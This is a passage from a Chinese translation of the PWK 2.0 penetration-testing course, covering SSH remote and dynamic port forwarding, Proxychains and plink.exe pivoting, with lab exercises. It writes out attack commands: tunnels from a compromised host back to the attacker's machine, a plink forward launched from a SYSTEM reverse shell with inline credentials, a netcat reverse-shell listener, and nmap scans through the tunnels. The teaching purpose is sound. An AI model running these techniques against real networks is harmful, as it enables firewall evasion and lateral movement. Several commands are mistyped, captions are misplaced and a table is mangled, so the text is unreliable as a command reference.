
kali@kali:~ # sudo /etc/init.d/smbd restart

正在重启 smbd (通过 systemctl): smbd.

```
kali@kali:~ # smclient -127.0.0.1 -U Administrator
输入密码：
```

用于创建此隧道的 ssh 命令语法将包含本地 IP 和端口、远程 IP 和端口，以指定远程端口转发：

```
ssh -N -R [bind_address:]port:host:port [username@address]
```

# 列表 638 - 使用 SSH 进行远程端口转发的命令原型

在这种情况下，我们将以 Kali 用户身份 ssh 登录到 Kali 机器 (`kali@10.11.0.4`)，指定无命令 (`-N`) 和远程转发 (`-R`)。我们将在 Kali 机器的 TCP 端口 2221 上开启监听器，并将连接转发到内部 Linux 机器的 TCP 端口 3306 (`127.0.0.1:3306`)：

# 列表 639 - 将 TCP 端口 2221 远程转发到受控 Linux 机器的 TCP 端口 3306

这将通过 SSH 隧道 (TCP 22) 将我们系统本地端口 2221 的所有入站流量转发到受控机器的 3306 端口，使得即使该端口被防火墙过滤，我们也能访问 MySQL 端口。

我们的连接可以如图 299 所示：

图 299：远程端口转发图

```
student@debian:~~$ ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
kali@10.11.0.4's password:
```

| 攻击者 (Kali) | 防火墙 |
| :--- | :--- |
| 允许 TCP 端口 3389 入且没有入站过滤 | 一旦隧道建立，攻击者可以通过隧道扫描 MYSQL 服务：`nmap -sV -sV 127.0.0.1 -p 2221` |
| 远程端口转发：`ssh -R -f a.b.c.d 2221:127.0.0.1:3306 root@a.b.c.d s.l.u.v` | | |

PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 605

# 使用 Kali Linux 进行渗透测试 2.0

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_706_0.png)

隧道建立后，我们切换到 Kali 机器，验证 TCP 端口 2221 正在监听，并使用 nmap 扫描该端口的 localhost，这将识别目标 MySQL 服务的指纹：

```bash
kali@kali: $ ss -antlp | grep "2221"
LISTEN 0 128 127.0.0.1:2221 0.0.0.0*:users:(("sshd",pid=2294,fd=9)) LISTEN 0 128 [::]:2221 [*:users:(("sshd",pid=2294,fd=8))
```

```bash
kali@kali: $ sudo nmap -sS -SV -p 2221 127.0.0.1
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000399s latency).
PORT STATE SERVICE
2221/tcp open mysql MySQL 5.5.5-10-MariaDB-0-debu1
Nmap: 1 IP address (1 host up) scanned in 0.56 seconds
```

列表 640 - 通过远程隧道访问受害者机器上的 MySQL 服务器

既然知道可以扫描目标，那么使用任何适当的 Kali 已安装工具通过 SSH 隧道与 MySQL 服务进行交互就没有任何问题。

## 20.2.2 练习

- 1. 使用 SSH 连接到你的专用 Linux 实验室，并以 root 身份运行 `/root/port_forwarding_and_tunneling/` 下的 `clear-rules.sh` 脚本。
- 2. 关闭与专用 Linux 实验室的所有连接，使用桌面以 student 账户登录，并以 root 身份运行 `/root/port_forwarding_and_tunneling/` 下的 `ssh_remote_port_forward.sh`。
- 3. 尝试复制上述场景涵盖的 SSH 远程端口转发，并确保你可以扫描并与 MySQL 服务进行交互。

## 20.2.3 SSH 动态端口转发

现在是有趣的部分了。SSH 动态端口转发允许我们设置一个本地监听端口，并通过代理将流量隧道到任何远程目标。

在该场景中（类似于 SSH 本地端口转发部分的场景），我们攻破了一个基于 Linux 的目标并提升了权限。防火墙没有任何入站或出站流量限制。

在对攻破的 Linux 客户端进行枚举后，我们发现它除了连接到当前网络 (`10.11.0.x`) 外，还有一个额外的网络接口似乎连接到不同的网络 (`192.168.1.x`)。在该子网上，我们发现了一个可用共享的 Windows Server 2016 机器。

在本地端口转发部分，我们成功地与 Windows Server 2016 机器上的可用共享进行了交互；然而，该技术限于特定的 IP 地址和端口。例如，我们希望在 Windows Server 2016 机器上添加目标端口，或添加内网主机，而无需为每个感兴趣的端口建立隧道。

PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved. 606

为了在实验室中模拟此场景，我们将再次从专用 Linux 客户端运行 `ssh_local_port_forwarding.sh`。环境设置好，我们可以使用 `ssh -D` 指定本地 SOCKS4 端口转发（在 SSH 隧道内），语法如下：

```
ssh -N -D <port> <username>@<address>
```

列表 641 - 使用 SSH 进行动态端口转发的命令

考虑到上述语法，我们可以在 Kali 机器的 8080 端口创建一个本地 SOCKS4 代理 (`-N -D`) (`127.0.0.1:8080`)，这将所有入站流量隧道到攻破的 Linux 机器 (`10.11.0.1`)。

列表 642 - 在 8080 端口到目标网络创建隧道

尽管我们创建了一个可以将流量路由到目标网络的代理，但必须让侦察和攻击工具使用此代理。我们可以通过 HTTP、SOCKS4 和 SOCKS5 代理使用任何网络。

# 使用 Kali Linux 进行渗透测试

要配置 Proxychains，我们只需编辑主文件 (`/etc/proxychains.conf`)，并在 Proxychains 的帮助下添加我们的 SOCKS4 代理：

```bash
kali@kali:~$ cat /etc/proxychains.conf
# defaults
# socks4 127.0.0.1 8080
```

列表 643 - 向 Proxychains 配置添加 SOCKS4 代理

为了通过 SOCKS4 代理运行工具，我们在每个命令前加上 `proxychains`。例如，让我们尝试使用 nmap 扫描目标网络上的 Windows Server 2016 机器。在这个例子中，除了 nmap 命令及其参数外，我们没有向 proxychains 提供任何选项：

```bash
kali@kali:~$ proxychains nmap --ports 20-80 -sT 192.168.1.110
Starting nmap 7.60 (https://nmap.org) at 2019-04-19 18:18
[S-chain]-127.0.0.1:8080-->192.168.1.110:443
[S-chain]-127.0.0.1:8080-->192.168.1.110:23
[S-chain]-127.0.0.1:8080-->192.168.1.110:80
[S-chain]-127.0.0.1:8080-->192.168.1.110:115 OK
[S-chain]-127.0.0.1:8080-->192.168.1.110:445 OK
[S-chain]-127.0.0.1:8080-->192.168.1.110:139 OK
[S-chain]-127.0.0.1:8080-->192.168.1.110:122 timeout
[S-chain]-127.0.0.1:8080-->192.168.1.110:173 timeout
[S-chain]-127.0.0.1:8080-->192.168.1.110:211 timeout
[S-chain]-127.0.0.1:8080-->192.168.1.110:590 timeout
[S-chain]-127.0.0.1:8080-->192.168.1.110:111 timeout
[S-chain]-127.0.0.1:8080-->192.168.1.110:143 timeout
[S-chain]-127.0.0.1:8080-->192.168.1.110:3306 timeout
[S-chain]-127.0.0.1:8080-->192.168.1.110:995
```

列表 644 — 使用代理通过动态隧道扫描机器

在这种情况下，Proxychains 按照预期工作，动态地路由所有流量，而无需提供单个端口。

PWK 2.0 Copyright © Offensive Security Ltd. All rights reserved.

# 20.2.1 练习

- 1. 使用 SSH 连接到你的专用 Linux 实验室，并以 root 身份运行 `/root/port_forwarding_and_tunneling/` 下的 `clear-rules.sh` 脚本。
- 2. 记录 Linux 客户端和 Windows Server 2016 的 IP 地址。
- 3. 在你的 Kali 机器上创建一个 SOCKS 代理，通过 Linux 目标建立隧道。
- 4. 通过代理对 Windows Server 2016 机器执行成功的 nmap 扫描。
- 5. 通过隧道执行 nmap SYN 扫描。它有效吗？结果准确吗？

# 使用 Kali Linux 进行渗透测试 2.0

![](img/dc318d3c28aa8a78cc9cc8bcbf10f77_710_0.png)

## 20.3 PLINK.exe

到目前为止，我们使用的所有端口转发和隧道方法都围绕着 *NIX 系统* 中常见的工具展开。接下来，让我们研究如何在 Windows 操作系统上执行端口转发和隧道技术。

为了演示这一点，假设我们在评估过程中，通过 Sync Breeze 软件的一个漏洞获取了 Windows 10 机器的访问权限，并获得了一个 SYSTEM 级别的反向 shell。

列表 645 - 从 Windows 10 接收反向 shell

在枚举和信息收集过程中，我们发现 TCP 端口 3306 上运行着 MySQL 服务。

列表 646 - 识别在端口 3306 上运行的 MYSQL 服务

我们想要扫描此数据库或与服务交互。然而，由于防火墙的存在，我们无法从 Kali 机器直接与该服务交互。

为了克服目标的限制，我们将传输 `plink.exe`，这是一个 Windows 命令行 SSH 客户端（PuTTY 项目的一部分）。该程序的语法与基于 UNIX 的 ssh 客户端类似：

```
kali@kali:~$ sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.22] 49937
Microsoft Windows [Version 10.0.16299.369]
(c) 2017 Microsoft Corporation. All rights reserved.
C:\Windows\system32>netstat -anbp TCP
```

| Proto | Local Address | Foreign Address | State | Process |
| :--- | :--- | :--- | :--- | :--- |
| TCP | 0.0.0.0:80 | 0.0.0.0:0 | LISTENING | syncbrs.exe |
| TCP | 0.0.0.0:135 | 0.0.0.0:0 | LISTENING | svchost.exe |
| TCP | 0.0.0.0:445 | 0.0.0.0:0 | LISTENING | Can not obtain ownership information |
| TCP | 0.0.0.0:3306 | 0.0.0.0:0 | LISTENING | mysqld.exe |

```
C:\Tools\port_redirection_and_tunneling> plink.exe
Plink: command-line connection utility
Release 0.70
Usage: plink [options] [user@host] [command]
"host" 也可以是一个 PuTTY 保存会话
Options:
- -V print version information and exit
- -g print PGP fingerprints and exit
- -v show verbose messages
- -load session Load settings from saved session
- -ssh -telnet -login -raw -serial
- -P force use of a particular protocol
- -p connect to specified port
- -l connect with specified username
- -batch disable all interactive prompts
- -proxycmd command use 'command' as local proxy
- -s
- -sercfg configuration-string (e.g. 19200,8,n,1,X) Specify the serial configuration (only)

以下选项允许建立 SSH 连接:
- -pw pass login with specified password
- -D [listen-IP:]listen-port Dynamic SOCKS-based port forwarding
- -L [listen-IP:]listen-port:host:port Forward local port to remote address
- -R [listen-IP:]listen-port:host:port Forward remote port to local address
- -X -x -A -t -T enable / disable X11 forwarding, enable / disable agent forwarding, enable / disable pty allocation
```

列表 647 - plink.exe 帮助菜单

我们可以使用 `plink.exe` 通过 SSH (`-ssh`) 连接到我们的 Kali 机器 (`10.11.0.4`)，使用 kali 用户 (`-l kali`) 和密码 "ilak" (`-pw ilak`)，通过以下命令为端口 1234 (`10.11.0.4:1234`) 创建远程端口转发 (`-R`)，将 Windows 目标机器上的 MySQL 端口 (`127.0.0.1:3306`) 映射到本地：

列表 648 - 尝试在未知主机上设置远程端口转发

plink 第一次连接到主机时，它将尝试将主机密钥缓存到注册表中。如果我们通过 rdesktop 连接到 Windows 客户端运行该命令，我们就能看到这个交互步骤：

```
C:\Tools\port_redirection_and_tunneling> plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
```

然而，由于这在反向 shell 中可能无法进行交互，我们应该将答案管道传输到 `cmd.exe`。从我们的反向 shell 中，此命令将在无需任何交互的情况下成功建立远程端口转发：

```
C:\Tools\port_redirection_and_tunneling\cmd.exe /echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
```

列表 649 - 使用 plink.exe 建立远程隧道

包含的程序是 Kali/Linux 自带的，它是免费的；对于 Windows 10，这些方法描述在 `/usr/share/` 中。现在隧道已建立，我们可以尝试通过 nmap 扫描 localhost：

```
kali@kali:~ $ sudo nmap -sV 127.0.0.1 -p 1234
Starting Nmap 7.60 (https://nmap.org)
Nmap scan for 127.0.0.1
Host 127.0.0.1 is up (0.000042ms).
PORT SERVICE VERSION
1234/tcp open MySQL 5.5-MariaDB
Nmap done: 0.27 seconds
```
